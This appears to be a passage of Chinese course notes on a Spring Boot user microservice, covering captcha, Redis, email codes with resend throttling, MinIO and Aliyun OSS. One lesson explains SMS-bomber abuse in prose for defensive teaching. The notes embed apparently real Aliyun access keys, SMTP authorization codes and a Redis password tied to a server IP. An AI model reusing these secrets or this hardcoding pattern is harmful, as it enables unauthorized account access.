     * 状态码 0 表示成功，1表示处理中，-1表示失败
     */

    private Integer code;
    /**
     * 数据
     */
    private Object data;
    /**
     * 描述
     */
    private String msg;


    /**
     * 成功，传入数据
     * @return
     */
    public static JsonData buildSuccess() {
        return new JsonData(0, null, null);
    }

    /**
     *  成功，传入数据
     * @param data
     * @return
     */
    public static JsonData buildSuccess(Object data) {
        return new JsonData(0, data, null);
    }

    /**
     * 失败，传入描述信息
     * @param msg
     * @return
     */
    public static JsonData buildError(String msg) {
        return new JsonData(-1, null, msg);
    }

   
    /**
     * 自定义状态码和错误信息
     * @param code
     * @param msg
     * @return
     */
    public static JsonData buildCodeAndMsg(int code, String msg) {
        return new JsonData(code, null, msg);
    }

    /**
     * 传入枚举，返回信息
     * @param codeEnum
     * @return
     */
    public static JsonData buildResult(BizCodeEnum codeEnum){
        return JsonData.buildCodeAndMsg(codeEnum.getCode(),codeEnum.getMessage());
    }
}

```



















#### 第5集 微服务自定义全局异常+处理器handler开发

**简介：自定义全局异常+处理器开发**

* 自定义全局异常

```
/**
 * 全局异常处理
 */
@Data
public class BizException extends RuntimeException {

    private Integer code;
    private String msg;

    public BizException(Integer code, String message) {
        super(message);
        this.code = code;
        this.msg = message;
    }

    public BizException(BizCodeEnum bizCodeEnum) {
        super(bizCodeEnum.getMsg());
        this.code = bizCodeEnum.getCode();
        this.msg = bizCodeEnum.getMsg();
    }

}
```

* 自定义异常处理器

```
@ControllerAdvice
@Slf4j
public class ExceptionHandle {

    @ExceptionHandler(value = Exception.class)
    @ResponseBody
    public JsonData Handle(Exception e) {

        if (e instanceof BizException) {
            BizException bizException = (BizException) e;
            log.info("[业务异常]{}", e);
            return JsonData.buildError(bizException.getMsg(), bizException.getCode());

        } else {
            log.info("[系统异常]{}", e);
            return JsonData.buildError("全局异常，未知错误");
        }

    }
}
```













#### 第6集 微服务项目集成Spring Boot Test单元测试和sql日志打印

**简介：微服务项目集成Spring Boot Test单元测试**

- 需求分析->设计->开发->测试->上线
  - 单元测试:  完成最小的软件设计单元的验证工作，目标是确保模块被正确的编码

* Spring Boot Test 是在Spring Test之上的再次封装,  使用@SpringBootTest后，Spring将加载所有被管理的bean，等同于启动了整个服务

* common项目添加依赖

```
<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-test</artifactId>
</dependency>
```

* xdclass-user-service项目新建测试

```
@RunWith(SpringRunner.class)
@SpringBootTest(classes = UserApplication.class)
@Slf4j
public class AddressTest {

    @Autowired
    private AddressService addressService;


    @Test
    public void testAddressDetail(){

        AddressDO addressDO = addressService.detail(1L);
        log.info(addressDO.toString());
    }


}
```

* Mybatis plus配置控制台打印日志

```
#配置plus打印sql日志
mybatis-plus:
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl
```















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第八章 用户微服务注册模块需求-安全攻防的那些事情



#### 第1集 用户微服务注册需求介绍

**简介：介绍微服务注册功能和流程介绍**

* 功能需求
  * 使用邮箱注册，已经注册的邮箱不能重复注册
  * 密码不能使用简单的MD5加密
  * 用户上传头像需要用文件存储
* 功能演示
  * 手机号 13113777888
  * 邮箱  794666918@qq.com

* 安全需求
  * 高并发下邮箱唯一性
  * 注册邮箱或者手机验证码不能被恶意调用
  * 头像文件存储访问方便扩容和管理



* 针对每个功能，初级开发和高级开发的思路是不一样
  * 产品经理提业务需求
  * 安全需求就是自己的经验，不然最终背锅的还是自己

























#### 第2集 验证码安全需求-灰色产业短信邮箱轰炸机介绍

**简介：从邮箱短信验证码介绍老一代的轰炸机**

* 什么是短信-邮箱轰炸机：

```
手机短信轰炸机是批量、循环给手机无限发送各种网站的注册验证码短信的方法。
```

* 美好的初衷-发明的由来

```
最早发明是用来整治街头广告电话号泛滥的一种手段，采用“手机短信轰炸机”软件可无限发送垃圾短信到牛皮癣小广告的手机号码上，使对方的手机快速消耗电量，变成高频率振动棒，且无法正常使用。

“短信轰炸机”可严厉打击城市“牛皮癣”，还城市明净容颜。
```

* 灰色产业的目光-也就是部分不法分子利用

```
某次大型程序员相亲现场-老王得罪了小王， 小王不爽，就道听途说知道了”短信轰炸机“，1天50元，轰炸了5天还打折300元。

一天内接到来自全国各地数千个陌生电话短信的轰炸骚扰，导致个人通讯中断，被工作生活受到严重影响，连刚相亲到的女友没没法联系上了。
```



⚠️郑重声明⚠️：本集内容只限于小滴课堂用于教学提高业务系统安全性，切勿使用课程思路进行攻击破坏或者获取利益，如产生的一切后果与本人和所属公司无关。

```
《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。

【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚

天网恢恢，疏而不漏，一切操作都是可以被追寻到的，ip/设备/网络/基站/监控等等，总有你想不到的方式抓到你
```

* 原理

```
很多人都用手机注册一些网站的验证了，比如手机验证码。先填手机号，然后发一条验证码过去，输入验证码，完成验证，注册成功。

* 寻找大量肉鸡网站，寻找发送验证码的请求接口

* 如果找不到接口，也可以使用自动化UI工具触发

* 编写程序和调度任务，相关脚本录入数据库

* 输入目标手机号或者邮箱，触发攻击
```

* 公司带来的损失
  * 短信一条5分钱，如果被大量盗刷大家自己计算
  * 邮箱通知不用钱，但被大量盗刷，带宽、连接等都被占用，导致无法正常使用





















#### 第3集  自动化脚本 - 程序员和灰色产业的攻与防

**简介：开发人员和灰色产业的那些事情**

* 请大家先看一个自动化脚本技术视频
  * 第2分35秒：https://xdclass.net/#/dplayer?video_id=16&e_id=1000
  * 延伸
    * 抢票
    * 稀缺的酒、鞋等



* 案例二：你需要考虑的是批量注册账号

```
朋友圈、群经常能看到某平台上的点赞、刷粉等业务，比如某d音、某w信

很大程度就是平台一开始研发的时候，没关注安全账号体系，

灰色产业嗅觉灵敏：时刻顶着大平台的产品，一出现就会大量注册账号(因为安全防范最弱)，公司看到注册用户指数级上涨更开心

谁能知道，BAT的大厂的产品 几十亿甚至几百亿账号里面有多少是僵尸号
```



* 如何避免自己的网站成为”肉鸡“或者被刷呢
  * 增加图形验证码（开发人员）
  * 单IP请求次数限制（开发人员）
  * 限制号码发送（一般短信提供商会做）



* 是否可以一劳永逸？？？

  * 没有百分百的安全，验证码是可以破解的，ip也是可以租用代理ip的

  * 攻防永远是有的，只过加大了攻击者的成本，ROI划不过来自然就放弃了

    















#### 第4集  图形验证码开发之谷歌kaptcha引入

**简介：谷歌开源kaptcha图形验证码开发**

* Kaptcha 框架介绍 谷歌开源的一个可高度配置的实用验证码生成工具
  - 验证码的字体/大小/颜色
  - 验证码内容的范围(数字，字母，中文汉字！)
  - 验证码图片的大小，边框，边框粗细，边框颜色
  - 验证码的干扰线
  - 验证码的样式(鱼眼样式、3D、普通模糊)

* 聚合工程依赖添加（使用国内baomidou二次封装的springboot整合starter）

```
            <!--kaptcha依赖包-->
            <dependency>
                <groupId>com.baomidou</groupId>
                <artifactId>kaptcha-spring-boot-starter</artifactId>
                <version>1.1.0</version>
            </dependency>
```

* 用户服务添加

```
            <dependency>
                <groupId>com.baomidou</groupId>
                <artifactId>kaptcha-spring-boot-starter</artifactId>
            </dependency>
```

* 开发配置（任何框架和springboot整合基本都是）

```
@Configuration
public class CaptchaConfig {

    /**
     * 验证码配置
     * Kaptcha配置类名
     * 
     * @return
     */
    @Bean
    @Qualifier("captchaProducer")
    public DefaultKaptcha kaptcha() {
        DefaultKaptcha kaptcha = new DefaultKaptcha();
        Properties properties = new Properties();
//		properties.setProperty(Constants.KAPTCHA_BORDER, "yes");
//		properties.setProperty(Constants.KAPTCHA_BORDER_COLOR, "220,220,220");
//		//properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_FONT_COLOR, "38,29,12");
//		properties.setProperty(Constants.KAPTCHA_IMAGE_WIDTH, "147");
//		properties.setProperty(Constants.KAPTCHA_IMAGE_HEIGHT, "34");
//		properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_FONT_SIZE, "25");
//		//properties.setProperty(Constants.KAPTCHA_SESSION_KEY, "code");
        //验证码个数
        properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_CHAR_LENGTH, "4");
//		properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_FONT_NAMES, "Courier");
        //字体间隔
        properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_CHAR_SPACE,"8");
        //干扰线颜色
//		properties.setProperty(Constants.KAPTCHA_NOISE_COLOR, "white");
        //干扰实现类
        properties.setProperty(Constants.KAPTCHA_NOISE_IMPL, "com.google.code.kaptcha.impl.NoNoise");
        //图片样式
        properties.setProperty(Constants.KAPTCHA_OBSCURIFICATOR_IMPL, "com.google.code.kaptcha.impl.WaterRipple");
        //文字来源
        properties.setProperty(Constants.KAPTCHA_TEXTPRODUCER_CHAR_STRING, "0123456789");
        Config config = new Config(properties);
        kaptcha.setConfig(config);
        return kaptcha;
    }
}

```

* 开发一个Controller使用测试

















#### 第5集 Linux服务器Docker安装和部署容器化Redis

**简介：Linux环境下docker部署+redis安装**

* Linux环境下安装Docker
  * 阿里云购买地址：https://www.aliyun.com/minisite/goods?taskCode=pintuan20201212&recordId=292600&userCode=r5saexap

```
#依次运行以下命令添加yum源
yum update
yum install epel-release -y
yum clean all
yum list


#安装并运行Docker。
yum install docker-io -y
systemctl start docker

#检查安装结果。
docker info

#启动使用Docker
systemctl start docker     #运行Docker守护进程
systemctl stop docker      #停止Docker守护进程
systemctl restart docker   #重启Docker守护进程


#修改镜像仓库
vim /etc/docker/daemon.json
#改为下面内容，然后重启docker
{
"debug":true,"experimental":true,
"registry-mirrors":["https://pb5bklzr.mirror.aliyuncs.com","https://hub-mirror.c.163.com","https://docker.mirrors.ustc.edu.cn"]
}

#查看信息
docker info
```





* docker部署redis 并配置密码

  * 如果访问不了，记得看防火墙/网络安全组端口是否开放
  * 源码安装redis的话默认不能远程访问
  * docker安装redis可以远程访问

  ```
  docker run -itd --name xdclass-redis -p 8000:6379 redis --requirepass 123456
  ```

  | Options | Mean                                               |
  | ------- | -------------------------------------------------- |
  | -i      | 以交互模式运行容器，通常与 -t 同时使用；           |
  | -t      | 为容器重新分配一个伪输入终端，通常与 -i 同时使用； |
  | -d      | 后台运行容器，并返回容器ID；                       |



















#### 第6集 用户微服务开发图形验证码加入缓存

**简介：用户微服务开发图形验证码接口**

* redis做隔离, 多集群：核心集群和非核心集群，高并发集群和非高并发集群
  * 资源隔离
  * 数据保护
  * 提高性能
  * key规范：业务划分，冒号隔离
    * user-service:captcha:xxxx
    * 长度不能过长

* 大家一定要有自己的工具集



* 用户微服务配置Redis

```
spring:
  application:
    name: xdclass-user-service
  redis:
    host: 112.74.55.160
    password: 123456
    port: 8000
```



* common聚合工程依赖配置

```
       <!--redis客户端-->
       <dependency>
           <groupId>org.springframework.boot</groupId>
           <artifactId>spring-boot-starter-data-redis</artifactId>
           <exclusions>
               <exclusion>
                   <groupId>io.lettuce</groupId>
                   <artifactId>lettuce-core</artifactId>
               </exclusion>
           </exclusions>
       </dependency>
       <dependency>
           <groupId>redis.clients</groupId>
           <artifactId>jedis</artifactId>
       </dependency>
```



* 验证码接口开发

```
/**
     *临时使用10分钟有效，方便测试
     */
    private static final long CAPTCHA_CODE_EXPIRED = 60 * 1000 * 10;

    /**
     * 获取图形验证码
     * @param request
     * @param response
     */
    @ApiOperation("获取图形验证码")
    @GetMapping("captcha")
    public void getCaptcha(HttpServletRequest request, HttpServletResponse response){

        String cacheKey = getCaptchaKey(request);

        String capText = captchaProducer.createText();

        //存储     redisTemplate.opsForValue().set(cacheKey,capText,CAPTCHA_CODE_EXPIRED,TimeUnit.MILLISECONDS);

        BufferedImage bi = captchaProducer.createImage(capText);
        ServletOutputStream out = null;
        try {
            response.setDateHeader("Expires", 0);
            response.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
            response.addHeader("Cache-Control", "create_date-check=0, pre-check=0");
            response.setHeader("Pragma", "no-cache");
            out = response.getOutputStream();
            ImageIO.write(bi, "jpg", out);
            out.flush();
            out.close();

        } catch (IOException e) {
            log.error("获取验证码失败:{}",e);
        }
    }
```

* CommonUtil工具类

```

    /**
     * 获取ip
     * @param request
     * @return
     */
    public static String getIpAddr(HttpServletRequest request) {
        String ipAddress = null;
        try {
            ipAddress = request.getHeader("x-forwarded-for");
            if (ipAddress == null || ipAddress.length() == 0 || "unknown".equalsIgnoreCase(ipAddress)) {
                ipAddress = request.getHeader("Proxy-Client-IP");
            }
            if (ipAddress == null || ipAddress.length() == 0 || "unknown".equalsIgnoreCase(ipAddress)) {
                ipAddress = request.getHeader("WL-Proxy-Client-IP");
            }
            if (ipAddress == null || ipAddress.length() == 0 || "unknown".equalsIgnoreCase(ipAddress)) {
                ipAddress = request.getRemoteAddr();
                if (ipAddress.equals("127.0.0.1")) {
                    // 根据网卡取本机配置的IP
                    InetAddress inet = null;
                    try {
                        inet = InetAddress.getLocalHost();
                    } catch (UnknownHostException e) {
                        e.printStackTrace();
                    }
                    ipAddress = inet.getHostAddress();
                }
            }
            // 对于通过多个代理的情况，第一个IP为客户端真实IP,多个IP按照','分割
            if (ipAddress != null && ipAddress.length() > 15) {
                // "***.***.***.***".length()
                // = 15
                if (ipAddress.indexOf(",") > 0) {
                    ipAddress = ipAddress.substring(0, ipAddress.indexOf(","));
                }
            }
        } catch (Exception e) {
            ipAddress="";
        }
        return ipAddress;
    }



    public static String MD5(String data)  {
        try {
            java.security.MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] array = md.digest(data.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte item : array) {
                sb.append(Integer.toHexString((item & 0xFF) | 0x100).substring(1, 3));
            }

            return sb.toString().toUpperCase();
        } catch (Exception exception) {
        }
        return null;

    }
```

















#### 第7集 邮件发送介绍和项目整合spring邮箱starter

**简介：讲解发送邮件的基础知识和项目整合邮箱配置**

- 邮件发送的基本过程与概念
  - 邮件服务器 ：类似于现实生活中的邮局，它主要负责接收用户投递过来的邮件，并把邮件投递到邮件接收者的电子邮箱中
  - 电子邮箱 ：用户在邮件服务器上申请的一个账户
    - from:[xxx@xx.com](mailto:xxx@xx.com)　　----发件人
    - to:[xxx@xx.com](mailto:xxx@xx.com) 　　----收件人
    - subject:hello　　　　　----主题
    - body: 欢迎来到小滴课堂 -----内容体
- 邮件传输协议
  - SMTP协议：全称为 Simple Mail Transfer Protocol，简单邮件传输协议。它定义了邮件客户端软件和SMTP邮件服务器之间，以及两台SMTP邮件服务器之间的通信规则
  - POP3协议：全称为 Post Office Protocol，邮局协议。它定义了邮件客户端软件和POP3邮件服务器的通信 规则
  - IMAP协议：全称为 Internet Message Access Protocol,Internet消息访问协议，它是对POP3协议一种扩展，也是定义了邮件客户端软件和IMAP邮件服务器的通信规则

* 账号准备和配置
  * https://mail.126.com/
  * 发送端使用网易邮箱
  * 使用邮箱授权码发送 
    * HGCKFIBFYWRIPGCC

* user-service项目配置添加依赖

```
 <!--发送邮件-->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-mail</artifactId>
        </dependency>
```

* 配置文件

```
#邮箱服务配置  
  mail:
      host: smtp.126.com #发送邮件服务器
      username: waitforxy@126.com #发送邮件的邮箱地址
      password: CJVYSJOTRXUSSEJE #客户端授权码，不是邮箱密码,网易的是自己设置的
      from: waitforxy@126.com # 发送邮件的地址，和上面username一致

      properties.mail.smtp.starttls.enable: true
      properties.mail.smtp.starttls.required: true
      properties.mail.smtp.ssl.enable: true
      default-encoding: utf-8
```



* 用户微服务 service封装

```
@Service
@Slf4j
public class MailServiceImpl implements MailService {

    /**
     * Spring Boot 提供了一个发送邮件的简单抽象，直接注入即可使用
     */
    @Autowired
    private JavaMailSender mailSender;

    /**
     * 配置文件中的发送邮箱
     */
    @Value("${spring.mail.from}")
    private String from;

    @Override
    public void sendSimpleMail(String to, String subject, String content) {
        //创建SimpleMailMessage对象
        SimpleMailMessage message = new SimpleMailMessage();
        //邮件发送人
        message.setFrom(from);
        //邮件接收人
        message.setTo(to);
        //邮件主题
        message.setSubject(subject);
        //邮件内容
        message.setText(content);
        //发送邮件
        mailSender.send(message);
        log.info("邮件发成功:{}",message.toString());
    }


}
```



















#### 第8集 用户微服务之注册邮箱验证码接口开发

**简介：注册邮箱验证码接口开发**

- 接口开发

```
 /**
     * 支持手机号、邮箱发送验证码
     * @return
     */
    @ApiOperation("发送验证码")
    @GetMapping("send_code")
    public JsonData sendRegisterCode(@ApiParam("收信人") @RequestParam(value = "to", required = true)String to,
                                     @ApiParam("图形验证码") @RequestParam(value = "captcha", required = true)String  captcha,
                                     HttpServletRequest request){

        String key = getCaptchaKey(request);
        String cacheCaptcha = redisTemplate.opsForValue().get(key);

        if(captcha!=null && cacheCaptcha!=null && cacheCaptcha.equalsIgnoreCase(captcha)) {
            redisTemplate.delete(key);
            JsonData jsonData = notifyService.sendCode(SendCodeEnum.USER_REGISTER,to);
            return jsonData;
        }else {
            return JsonData.buildResult(BizCodeEnum.CODE_CAPTCHA);
        }

    }
```

* service层

```
  @Override
    public JsonData sendCode(SendCodeEnum sendCodeType, String to) {
      
        if(CheckUtil.isEmail(to)){
            //邮箱验证码
            mailService.sendSimpleMail(to,SUBJECT,String.format(CONTENT,code));
            return JsonData.buildSuccess();

        }else if(CheckUtil.isPhone(to)){
            //短信验证码
        }

        return JsonData.buildResult(BizCodeEnum.CODE_TO_ERROR);
    }
```

* 邮箱工具类正则

```
public class CheckUtil {

    /**
     * 邮箱正则
     */
    private static final Pattern MAIL_PATTERN = Pattern.compile("^([a-z0-9A-Z]+[-|\\.]?)+[a-z0-9A-Z]@([a-z0-9A-Z]+(-[a-z0-9A-Z]+)?\\.)+[a-zA-Z]{2,}$");

    /**
     * 手机号正则，暂时未用
     */
    private static final Pattern PHONE_PATTERN = Pattern.compile("^((13[0-9])|(15[^4,\\D])|(18[0,5-9]))\\d{8}$");

    /**
     * @param email
     * @return
     */
    public static  boolean isEmail(String email) {
        if (null == email || "".equals(email)) {
            return false;
        }
        Matcher m = MAIL_PATTERN.matcher(email);
        return m.matches();
    }

    /**
     * 暂时未用
     * @param phone
     * @return
     */
    public static boolean isPhone(String phone) {
        if (null == phone || "".equals(phone)) {
            return false;
        }
        Matcher m = PHONE_PATTERN.matcher(phone);
        return m.matches();

    }
}
```



























#### 第9集 关于注册邮箱验证码防刷设计方案你能想到几个

**简介：注册邮箱验证码防刷方案你能想到几个**

* 需求：一定时间内禁止重复发送邮件,大家想下有哪几种实现方式

  

  * 方式一：前端增加校验倒计时，不到60秒按钮不给点击

    * 简单
    * 不安全，存在绕过的情况

    

  * 方式二：增加Redis存储，发送的时候设置下额外的key，并且60秒后过期

    * 非原子操作，存在不一致性

    * 增加的额外的key - value存储，浪费空间

    * ```
      /**
       * 前置：判断是否重复发送
       *
       * 1、存储验证码到缓存
       *
       * 2、发送邮箱验证码
       *
       * 后置：存储发送记录
       **/
      ```

    

    

  * 方式三：基于原先的key拼装时间戳

    * 好处：满足了当前节点内的原子性，也满足业务需求

    

































#### 第10集 注册邮箱验证码防刷代码落地+整体测试

**简介：注册邮箱验证码防刷落地和整体测试**

```
			public JsonData sendCode(SendCodeEnum sendCodeEnum, String to) {

        String cacheKey = String.format(CacheKey.CHECK_CODE_KEY,sendCodeEnum.name(),to);

        String cacheValue = redisTemplate.opsForValue().get(cacheKey);

        //如果不为空，则判断是否60秒内重复发送
        if(StringUtils.isNotBlank(cacheValue)){
            long ttl = Long.parseLong(cacheValue.split("_")[1]);
            //当前时间戳-验证码发送时间戳，如果小于60秒，则不给重复发送
            if(CommonUtil.getCurrentTimestamp() - ttl < 1000*60){
                log.info("重复发送验证码,时间间隔:{} 秒",(CommonUtil.getCurrentTimestamp()-ttl)/1000);
                return JsonData.buildResult(BizCodeEnum.CODE_LIMITED);
            }
        }

        //拼接验证码 2322_324243232424324
        String code = CommonUtil.getRandomCode(6);

        String value = code+"_"+CommonUtil.getCurrentTimestamp();

        redisTemplate.opsForValue().set(cacheKey,value,CODE_EXPIRED,TimeUnit.MILLISECONDS);

        if(CheckUtil.isEmail(to)){
            //邮箱验证码
            mailService.sendMail(to,SUBJECT,String.format(CONTENT,code));

            return JsonData.buildSuccess();

        } else if(CheckUtil.isPhone(to)){
            //短信验证码

        }

        return JsonData.buildResult(BizCodeEnum.CODE_TO_ERROR);
    }
```

* 整体测试和总结





























**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第九章 分布式文件存储解决方案MinIO部署+阿里云OSS落地整合



#### 第1集 分布式文件存储讲解 和 高性能-高可用面试题

**简介：分布式文件存储解决核心知识介绍和面试题**

* 数据爆炸的时代，产生的数据量不断地在攀升，基本都离不开文件存储

  * 存储单位从KB、MB、GB、TB、PB到ZB级别的数据
  * 图片、文档、素材、静态化页面、长短视频、安装包等一系列文件

  

* 业务应用内存储

  * 传统的javaweb项目, 文件数量达到一定后占据大量的内存、磁盘和带宽, 无法满足海量请求的业务
  * 开发容易-扩容难

* 分布式文件系统（Distributed File System)

  * 海量数据对存储提出了新的要求，从而诞生了分布式文件存储

  * 是文件系统管理的物理存储资源不一定直接连接在本地节点上，而是通过计算机网络与节点（可简单的理解为一台计算机) 相连，或是若干不同的逻辑磁盘分区组合在一起而形成的完整的有层次的文件系统

  * 自研：扩容容易-开发难

    



* 面试题：做分布式文件存储，主要是想实现文件存储访问的高性能与高可用，如何保证分布式存储的高性能与高可用？

  

  ![3](img/3.png)

  * 大家可以想到基本就是副本备份、双活、多活这种架构
  
* 在系统中通过复制协议将数据同步到多个存储节点，并确保多个副本之间的数据一致性，当某个存储节点出故障时，系统能够自动将服务切换到其他的副本
  
*  在分布式存储中高性能与高可用是矛盾的，比如要设计一个分布式存储系统，CAP定理也可以推断出来
  
    * 对性能的考虑，记录数据时先写一个份数据到某个机器上并立即返回，然后异步发起多个数据备份过程。这种设计的性能最好，但存在“容错性”的风险，加入返回后，还没来得及同步给其它节点就宕机了，则数据就丢失（异步复制，也存在是写主节点到内存还是落到磁盘）
  * 如果同时写多个副本，每个副本写成功以后再返回，则又导致性能下降，这个过程取决于最慢的那台机器的性能 (同步多写，是同步每个副本节点还是一个副本先)
  
  
  
    * 那应该如何选择呢？
      * 根据业务而定，如果要求性能更高，偶尔出现文件丢失或访问出错则可以异步复制
    * 要求文件系统一定要高可用，则用同步多写的策略，牺牲一定的性能也要保证高可用数据一致性
  
  
  
  * 基于上述的，大家还知道有一个很类似的消息队列就是支持这种操作
  
    * RocketMQ消息高可用里面的
  
      * 同步双写、异步刷盘，即同时写到两个节点上的内存才返回，然后异步持久化到磁盘里面
  
        
  
   





















#### 第2集 分布式文件存储业界常见解决方案介绍

**简介：分布式文件存储常见解决方案介绍**

* 目前业界比较多这个解决方案，这边就挑选几个介绍下
  * MinIO

  ```
  是在 Apache License v2.0 下发布的对象存储服务器,学习成本低，安装运维简单，主流语言的客户端整合都有, 号称最强的对象存储文件服务器，且可以和容器化技术docker/k8s等结合，社区活跃但不够成熟，业界参考资料较少
  
  官网：https://docs.min.io/cn/
  ```

  

  * FastDFS

  ```
  一个开源的轻量级分布式文件系统,比较少的客户端可以整合，目前主要是C和java客户端，在一些互联网创业公司中有应用比较多，没有官方文档,社区不怎么活跃.
  架构+部署结构复杂，出问题定位比较难定位，可以说是fastdfs零件的组装过程，需要去理解fastDFS的架构设计，才能够正确的安装部署
  ```

  

  * 云厂商
    * 阿里云OSS

    * 七牛云

    * 腾讯云

    * 亚马逊云

      

    * CDN最强：Akamai https://www.akamai.com/cn



* 选云厂商理由
  * 优点：开发简单，功能强大，容易维护（不同网络下图片质量、水印、加密策略、扩容、加速）
  * 缺点：要钱, 个性化处理，未来转移比较复杂，不排除有些厂商会提供一键迁移工具



* 选开源MinIO的理由
  * 优点：功能强大、可以根据业务做二次的定制，新一代分布式文件存储系统，容器化结合强大，更重要的是免费（购买磁盘、内存、带宽）
  * 缺点：自己需要有专门的团队进行维护、扩容等

























#### 第3集 自建分布式文件存储MinIO容器化部署初体验

**简介：分布式文件存储MinIO容器化部署初体验**

* Docker容器化部署(用于测试体验)

  * 官网：https://docs.min.io/cn/

  ```
  docker run -p 9000:9000 \
    --name minio_xdclass \
    -v /Users/xdclass/Desktop/test:/data \
    -e "MINIO_ROOT_USER=AKIAIOSFODNN7EXAMPLE" \
    -e "MINIO_ROOT_PASSWORD=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" \
    minio/minio server /data
  ```

  

* 步骤
  * 访问控制台
  * 创建bucket
  * 上传文件
  * 预览

* 总结

```
总体操作很流畅，支持单机和集群部署，多个方面都是目前比较强的，
对于有需求不能或不使用云厂商提供的存储服务，例如阿里云的oss、七牛云的对象存储等，可以通过自建minio对象存储集群的方式
```















#### 第4集 阿里云OSS分布式对象存储介绍开通

**简介：阿里云OSS对象存储介绍和开通**

* 阿里云OSS介绍

```
对象存储OSS（Object Storage Service）是阿里云提供的海量、安全、低成本、高持久的云存储服务。其数据设计持久性不低于99.9999999999%（12个9），服务设计可用性不低于99.995%。

OSS具有与平台无关的RESTful API接口，您可以在任何应用、任何时间、任何地点存储和访问任意类型的数据。

提供标准、低频访问、归档和冷归档四种存储类型，全面覆盖从热到冷的各种数据存储场景：
```



| 标准存储类型     | 高持久、高可用、高性能的对象存储服务，支持频繁的数据访问。是各种社交、分享类的图片、音视频应用、大型网站、大数据分析的合适选择。 |
| ---------------- | ------------------------------------------------------------ |
| 低频访问存储类型 | 适合长期保存不经常访问的数据（平均每月访问频率1到2次）。存储单价低于标准类型，适合各类移动应用、智能设备、企业数据的长期备份，支持实时数据访问。 |
| 归档存储类型     | 适合需要长期保存（建议半年以上）的归档数据，在存储周期内极少被访问，数据进入到可读取状态需要1分钟的解冻时间。适合需要长期保存的档案数据、医疗影像、科学资料、影视素材。 |
| 冷归档存储类型   | 适合需要超长时间存放的极冷数据。例如因合规要求需要长期留存的数据、大数据及人工智能领域长期积累的原始数据、影视行业长期留存的媒体资源、在线教育行业的归档视频等。 |

* 开通阿里云OSS

  * 有阿里云账号、实名认证

  * OSS介绍：https://www.aliyun.com/product/oss

  * OSS控制台：https://oss.console.aliyun.com/bucket

  * 学习路径：https://help.aliyun.com/learn/learningpath/oss.html

    

* 开通后的操作
  * 创建Bucket
  * 上传文件
  * 访问文件

![image-20210201185729129](../../../Library/Application Support/typora-user-images/image-20210201185729129.png)



















#### 第5集 阿里云权限管理RAM介绍-玩转云产品核心知识

**简介：阿里云ram权限管理介绍**

* 文件上传流程

  * web控制台
  * 前端->后端程序->阿里云OSS

  ![image-20210202221809703](img/image-20210202221809703.png)

* 云账号 AccessKey

  * 访问阿里云 API 的密钥，具有该账户完全的权限

* RAM权限介绍

  * 阿里云用于各个产品的权限，基于RBAC模型，进行简单管理账号、统一分配权限、集中管控资源，从而建立安全、完善的资源控制体系。

  * 众多产品，一般采用子账号进行分配权限，防止越权攻击

    ![image-20210202222330838](img/image-20210202222330838.png)

  * 建立用户，勾选编程访问（保存accessKey和accessSecret，只出现一次）

    * accessKey:  LTAI4GJR7bL8JEzBv7zx69J4
    * accessSecret: CNfxHJeTTLlFQA2a2X5BprjqjK047l

    ![image-20210202222723510](img/image-20210202222723510.png)

  * 为新建用户授权OSS全部权限

    ![image-20210202224538864](img/image-20210202224538864.png)

    





​		























#### 第6集 阿里云OSS客户端SDK集成和测试存储服务

**简介：阿里云OSS对象存储客户端集成和测试服务**

* 添加阿里云OSS的SDK

  * 地址：https://help.aliyun.com/document_detail/32008.html

  * 添加maven依赖

    * 底层聚合工程添加版本

    ```
     <!-- OSS各个项目单独加依赖，根据需要进行添加-->
                <dependency>
                    <groupId>com.aliyun.oss</groupId>
                    <artifactId>aliyun-sdk-oss</artifactId>
                    <version>3.10.2</version>
                </dependency>
    ```

    * 用户微服务添加

    ```
     <!-- OSS各个项目单独加依赖，根据需要进行添加-->
            <dependency>
                <groupId>com.aliyun.oss</groupId>
                <artifactId>aliyun-sdk-oss</artifactId>
            </dependency>
    ```

    

* 用户微服务配置OSS

```
#阿里云OSS配置
aliyun:
  oss:
    endpoint: oss-cn-beijing.aliyuncs.com
    access-key-id: LTAI4GKz7Z1RRjzMYeHG3FCe
    access-key-secret: QilitkUsr0PMJYEK8MAPFdI4cFOLVq
    bucketname: xd-test1
```

* 新建配置类 (配置里面的横杠会，自动转驼峰)

```
@ConfigurationProperties(prefix = "aliyun.oss")
@Configuration
@Data
public class OSSConfig {

    private String endpoint;
    private String accessKeyId;
    private String accessKeySecret;
    private String bucketname;
}
```



















#### 第7集 用户微服务注册头像上传阿里云OSS服务层开发

**简介：用户微服务上传用户头像到oss服务层开发**

* 开发service

```
@Service
@Slf4j
public class FileServiceImpl implements FileService {


    @Autowired
    private OSSConfig ossConfig;


    @Override
    public String uploadUserHeadImg( MultipartFile file) {

        String originalFilename = file.getOriginalFilename();


        //获取相关配置
        String bucketName = ossConfig.getBucketname();
        String endpoint = ossConfig.getEndpoint();
        String accessKeyId = ossConfig.getAccessKeyId();
